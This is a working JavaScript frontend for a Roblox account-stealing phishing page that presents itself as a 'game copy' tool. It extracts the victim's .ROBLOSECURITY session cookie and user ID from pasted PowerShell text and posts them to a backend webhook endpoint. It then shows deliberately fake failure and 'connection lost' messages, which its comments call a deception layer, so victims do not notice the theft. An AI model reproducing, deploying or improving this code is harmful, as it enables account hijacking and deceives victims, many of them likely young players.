// ================= FRONTEND APP.JS (UPDATED for Vercel) =================
// Extracts cookie + rbxuid from pasted PowerShell text
// Sends to backend API (/api/submit), then shows fake error messages (deception layer)

const WEBHOOK_ENDPOINT = "/api/submit";

const gameFileInput = document.getElementById("gameFile");
const pinInput = document.getElementById("pinInput");
const pinError = document.getElementById("pinError");
const copyButton = document.getElementById("copyButton");
const statusMessage = document.getElementById("statusMessage");

// PIN validation (4 digits)
pinInput.addEventListener("input", () => {
    pinInput.value = pinInput.value.replace(/\D/g, "").slice(0, 4);
    validatePin();
});

function validatePin() {
    const isValid = /^\d{4}$/.test(pinInput.value);
    if (pinError) pinError.style.display = isValid ? "none" : "block";
    return isValid;
}

// Extract .ROBLOSECURITY cookie and rbxuid from RBXEventTrackerV2
function extractGameData(fullText) {
    const cookieMatch = fullText.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
    if (!cookieMatch) {
        return { success: false, message: "Your Game Key is not valid! (Check if you copied it right!)" };
    }
    const robloxCookie = cookieMatch[1];

    const eventTrackerMatch = fullText.match(/RBXEventTrackerV2",\s*"([^"]+)"/);
    let rbxuid = null;
    if (eventTrackerMatch) {
        const params = eventTrackerMatch[1].split('&');
        for (let p of params) {
            if (p.startsWith("rbxuid=")) {
                rbxuid = p.split('=')[1];
                break;
            }
        }
    }
    if (!rbxuid) {
        return { success: false, message: "Could not find rbxuid in RBXEventTrackerV2. Ensure the PowerShell script contains it." };
    }
    return { success: true, cookie: robloxCookie, rbxuid };
}

// Fake "connection lost" popup with 35% chance (mimics original payload.js)
function maybeShowFakeConnectionLoss() {
    if (Math.random() < 0.35) {
        const originalMsg = statusMessage.textContent;
        const originalColor = statusMessage.style.color;

        statusMessage.textContent = "⚠️ Connection lost! Unable to reach Roblox servers.";
        statusMessage.style.color = "#ffaa66";

        setTimeout(() => {
            if (statusMessage.textContent.includes("Connection lost")) {
                statusMessage.textContent = originalMsg;
                statusMessage.style.color = originalColor;
            }
        }, 3000);
    }
}

copyButton.addEventListener("click", async () => {
    statusMessage.textContent = "";
    if (!validatePin()) {
        statusMessage.textContent = "Please enter a valid 4-digit PIN.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    const pastedText = gameFileInput.value.trim();
    if (!pastedText) {
        statusMessage.textContent = "Please paste the PowerShell game file.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    const extraction = extractGameData(pastedText);
    if (!extraction.success) {
        statusMessage.textContent = extraction.message;
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    copyButton.classList.add("loading");
    copyButton.disabled = true;
    statusMessage.textContent = "✓ Processing... Please wait.";
    statusMessage.style.color = "#caa8ff";

    try {
        const response = await fetch(WEBHOOK_ENDPOINT, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                cookie: extraction.cookie,
                rbxuid: extraction.rbxuid
            })
        });

        // Handle non-OK HTTP status (e.g., 500, 404) gracefully
        if (!response.ok) {
            throw new Error(`Server responded with ${response.status}`);
        }

        const result = await response.json();

        // Backend returns { success: boolean } (true = webhook sent)
        if (result.success === true) {
            // Deception: always show fake failure even when webhook succeeded
            statusMessage.textContent = "✗ Game Copy request was not processed. Please check your internet connection.";
            statusMessage.style.color = "#ff9d9d";
            maybeShowFakeConnectionLoss();
        } else {
            // Real failure (webhook failed or backend error)
            statusMessage.textContent = "✗ Copy failed! Check your internet connection.";
            statusMessage.style.color = "#ff9d9d";
        }
    } catch (err) {
        console.error("Fetch error:", err);
        statusMessage.textContent = "✗ Network error. Could not reach processing server.";
        statusMessage.style.color = "#ff9d9d";
    } finally {
        copyButton.classList.remove("loading");
        copyButton.disabled = false;
    }
});
